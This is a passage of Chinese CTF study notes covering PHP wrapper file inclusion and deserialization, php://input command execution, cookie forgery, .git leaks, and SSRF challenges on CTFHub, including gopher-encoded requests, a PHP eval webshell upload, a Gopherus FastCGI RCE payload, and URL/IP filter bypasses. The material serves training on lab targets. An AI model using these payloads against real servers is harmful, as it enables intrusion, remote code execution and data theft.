<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要从URL中输入参数text,file和password。</p>
<p>data://text/plain用于数据流的读取，我们用data伪协议读出text里的内容。 一般为了绕过某些过滤都会用到base64，这里没有过滤所以可以不用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br><span class="line">data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
<p>preg_match()是执行匹配正则表达式，只要文件中有出现flag字眼，都会被过滤。此php文件还包含另一个php文件useless.php，利用php://filter来进行读取php文件，而不能直接用file=useless.php读取。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
<p>读取后会出现类似于乱码的东西，但其实那是base64编码，拿去解码，解出下面代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里提示我们有个flag.php文件，我们直接就将变量file等于这个文件，构造一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这里有个问题是为什么要序列化输出变量a呢，可能是因为在存password之前把password反序列化了，即我们存进去的密码不是我们输入的密码，而是将密码反序列化后的一串东西。所以我们要得到我们输入的密码就必须将存进去的密码序列化回来。</p>
<p>完整payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="14-6-2-php-input"><a href="#14-6-2-php-input" class="headerlink" title="14.6.2 php://input"></a>14.6.2 php://input</h3><p>php://input要求<code>allow_url_include</code>设置为<code>On</code>，所以得看看phpinfo()中的<code>allow_url_include</code>是否为<code>On</code>。</p>
<p>然后用burpsuite抓包，发送到repeater里去，将第一行设置为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://input HTTP/1.1</span><br></pre></td></tr></table></figure>
<p>在最下面设置为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&quot;ls /&quot;); ?&gt;	send,返回目录</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /falg_19485&quot;</span>);<span class="meta">?&gt;</span>	send,返回flag</span><br></pre></td></tr></table></figure>
<h3 id="14-6-3-php-filter"><a href="#14-6-3-php-filter" class="headerlink" title="14.6.3 php://filter"></a>14.6.3 php://filter</h3><p>参考如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://writeup.ctfhub.com/Skill/Web/RCE/366Ttyc8tGBiCyo54pR8YR.html</span><br></pre></td></tr></table></figure>
<h2 id="14-7-请求方式"><a href="#14-7-请求方式" class="headerlink" title="14.7 请求方式"></a>14.7 请求方式</h2><p>请求方式可以自定义。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">CTFHUB /index.php HTTP/1.1</span><br></pre></td></tr></table></figure>
<h2 id="14-8-302跳转"><a href="#14-8-302跳转" class="headerlink" title="14.8 302跳转"></a>14.8 302跳转</h2><p>302跳转将包发送到repeater模块查看响应包，因为在HTTP history模块里好像看不到响应包。</p>
<p>查看源代码链接指向index.php，然而在URL上看跳转到了index.html，所以发生了302跳转。</p>
<h2 id="14-9-Cookie"><a href="#14-9-Cookie" class="headerlink" title="14.9 Cookie"></a>14.9 Cookie</h2><p>cookie伪造，欺骗。直接在cookie管理器里修改。比如admin=0改为admin=1</p>
<h2 id="14-10-基本认证"><a href="#14-10-基本认证" class="headerlink" title="14.10 基本认证"></a>14.10 基本认证</h2><p>在HTTP中对于基础认证的一些知识，要求使用爆破的方法来获得基础认证的账号密码，之后登陆获得flag。</p>
<p>如何在burpsuite构造payload：</p>
<p><a target="_blank" rel="noopener" href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html</a></p>
<h1 id="15-信息泄露"><a href="#15-信息泄露" class="headerlink" title="15. 信息泄露"></a>15. 信息泄露</h1><h2 id="15-1-Git泄露"><a href="#15-1-Git泄露" class="headerlink" title="15.1 Git泄露"></a>15.1 Git泄露</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 </p>
<h3 id="15-1-1-Log"><a href="#15-1-1-Log" class="headerlink" title="15.1.1 Log"></a>15.1.1 Log</h3><p>Githack：.git泄露利用工具，可还原历史版本。</p>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure>
<h3 id="15-1-2-Stash"><a href="#15-1-2-Stash" class="headerlink" title="15.1.2 Stash"></a>15.1.2 Stash</h3><h3 id="15-1-3-Index"><a href="#15-1-3-Index" class="headerlink" title="15.1.3 Index"></a>15.1.3 Index</h3><h2 id="15-2-SVN泄露"><a href="#15-2-SVN泄露" class="headerlink" title="15.2 SVN泄露"></a>15.2 SVN泄露</h2><h2 id="15-3-HG泄露"><a href="#15-3-HG泄露" class="headerlink" title="15.3 HG泄露"></a>15.3 HG泄露</h2><h1 id="16-服务端请求伪造-SSRF"><a href="#16-服务端请求伪造-SSRF" class="headerlink" title="16. 服务端请求伪造(SSRF)"></a>16. 服务端请求伪造(SSRF)</h1><h2 id="16-1-内网访问"><a href="#16-1-内网访问" class="headerlink" title="16.1 内网访问"></a>16.1 内网访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
<p>小知识点，file://可以查看源码，前提要知道路径。这也是表示有SSRF漏洞的关键点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>
<h2 id="16-2-伪协议读取文件"><a href="#16-2-伪协议读取文件" class="headerlink" title="16.2 伪协议读取文件"></a>16.2 伪协议读取文件</h2><p>了解伪协议：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11673190.html">https://www.cnblogs.com/-mo-/p/11673190.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// – 本地文件传输协议，主要用于访问本地计算机中的文件。</span><br><span class="line"></span><br><span class="line">dict:// – 字典服务器协议，dict是基于查询相应的TCP协议。</span><br><span class="line"></span><br><span class="line">sftp:// – SSH文件传输协议或安全文件传输协议（Secure File Transfer Protocol）是一种简单的基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。</span><br><span class="line"></span><br><span class="line">ldap:// – 代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</span><br><span class="line"></span><br><span class="line">tftp:// – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。</span><br><span class="line"></span><br><span class="line">gopher:// – 是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</span><br></pre></td></tr></table></figure>
<h2 id="16-3-端口扫描"><a href="#16-3-端口扫描" class="headerlink" title="16.3 端口扫描"></a>16.3 端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/?url=127.0.0.1:8000</span><br><span class="line">题目会给端口号范围，用burpsuite爆破端口号</span><br></pre></td></tr></table></figure>
<h2 id="16-4-POST请求"><a href="#16-4-POST请求" class="headerlink" title="16.4 POST请求"></a>16.4 POST请求</h2><blockquote>
<p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 </p>
<p><a target="_blank" rel="noopener" href="http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_">http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_</a></p>
</blockquote>
<p>打开什么都没有，尝试一下10.1的内网访问</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php">http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</a></p>
</blockquote>
<p>查看源码发现信息：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=0dc2b8bce30276f8d0f0cb1472eb6c7d--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>是一个表单，要用POST方式提交key到flag.php上。因为要发送的不是php代码所以不能用php://input方式，但可以用gopher协议(curl支持gopher伪协议)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_payload(注意有下划线)</span><br></pre></td></tr></table></figure>
<p>构造POST内容，特别要注意Content-Length应为key的整个长度。将内容拿去URL编码2次(按理说是3次，但我们是在URL上构造，最后一次编码按回车浏览器会自动帮我们第3次编码)，第一次URL编码后要手动在所有%0A前面加上%0D(%0A是在linux系统中代表换行符，在windows中是%0D0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windows能够识别的)，再进行后续编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//第1次URL编码</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application/x-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//加上%0D</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//第2次URL编码</span><br><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//构造URL</span><br><span class="line">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br></pre></td></tr></table></figure>
<h2 id="16-5-上传文件"><a href="#16-5-上传文件" class="headerlink" title="16.5 上传文件"></a>16.5 上传文件</h2><blockquote>
<p>这次需要上传一个文件到flag.php了.祝你好运</p>
</blockquote>
<p>题目提示有flag.php，先打开看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-1897762186ae66ce.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
<p>发现有上传文件的接口，但没有提交按钮。那就自己做一个。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接这样提交一句话木马的话会出现</p>
<blockquote>
<p> Just View From 127.0.0.1 </p>
</blockquote>
<p>那我们抓一个包来用gopher构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------1114439304559070182630578745</span><br><span class="line">Content-Length: 287</span><br><span class="line"></span><br><span class="line">-----------------------------1114439304559070182630578745</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;hello world&quot;;</span><br><span class="line">eval($_POST[&#x27;caidao&#x27;]); ?&gt;</span><br><span class="line">-----------------------------1114439304559070182630578745--</span><br></pre></td></tr></table></figure>
<p>进行两次URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//第1次</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D---------------------------1114439304559070182630578745%0D%0AContent-Length%3A%20287%0D%0A%0D%0A-----------------------------1114439304559070182630578745%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell1.php%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%3C%3Fphp%20%0D%0Aecho%20%22hello%20world%22%3B%0D%0Aeval%28%24_POST%5B%27caidao%27%5D%29%3B%20%3F%3E%0D%0A-----------------------------1114439304559070182630578745--</span><br><span class="line">//第2次</span><br><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--</span><br><span class="line">//构造URL</span><br><span class="line">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;58dfbf57568807f03726d88b&#125;</span><br></pre></td></tr></table></figure>
<h2 id="16-6-FastCGI协议"><a href="#16-6-FastCGI协议" class="headerlink" title="16.6 FastCGI协议"></a>16.6 FastCGI协议</h2><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。</p>
<p>FastCGI协议分析</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>
<p>方法一：利用脚本</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51652864/article/details/118697060">https://blog.csdn.net/qq_51652864/article/details/118697060</a></p>
<p>监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000 &gt; 1.txt 	//监听的内容写到1.txt去</span><br></pre></td></tr></table></figure>
<p>方法二：利用gopherus</p>
<p>Gopherus安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure>
<p>去到Gopherus目录，利用fastcgi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure>
<p>填入<code>/var/www/html/index.php</code>和<code>whoami</code>，获得payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php  </span><br><span class="line">Terminal command to run:  whoami</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF:                 </span><br><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure>
<h2 id="16-7-URL-Bypass"><a href="#16-7-URL-Bypass" class="headerlink" title="16.7 URL Bypass"></a>16.7 URL Bypass</h2><p>url跳转bypass：<br>1.利用<code>?</code>绕过限制url=<a target="_blank" rel="noopener" href="https://www.baidu.com?www.xxxx.me">https://www.baidu.com?www.xxxx.me</a><br>2.利用<code>@</code>绕过限制url=<a target="_blank" rel="noopener" href="https://www.baidu.com@www.xxxx.me">https://www.baidu.com@www.xxxx.me</a><br>3.利用斜杠反斜杠绕过限制<br>4.利用<code>#</code>绕过限制url=<a target="_blank" rel="noopener" href="https://www.baidu.com#www.xxxx.me">https://www.baidu.com#www.xxxx.me</a><br>5.利用子域名绕过<br>6.利用畸形url绕过<br>7.利用跳转ip绕过 </p>
<blockquote>
<p>请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
</blockquote>
<p>给出提示，url参数的值中必须包含有<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com">http://notfound.ctfhub.com</a><br>可以采用@，也就是 HTTP 基本身份认证绕过。<br>HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。<br>也就是：<a target="_blank" rel="noopener" href="http://www.xxx.com@www.yyy.com形式">http://www.xxx.com@www.yyy.com形式</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
<h2 id="16-8-数字IP-Bypass"><a href="#16-8-数字IP-Bypass" class="headerlink" title="16.8 数字IP Bypass"></a>16.8 数字IP Bypass</h2><ul>
<li>IP进制转换：将点分十进制的IP格式转为其他【八进制】【十六进制】等格式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://127001/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure>
<ul>
<li>Enclosed Alphanumerics：由英文字母数字组成的Unicode字符集，位于圆圈，括号或其他未封闭的封闭空间内，或以句号结尾。如下</li>
</ul>
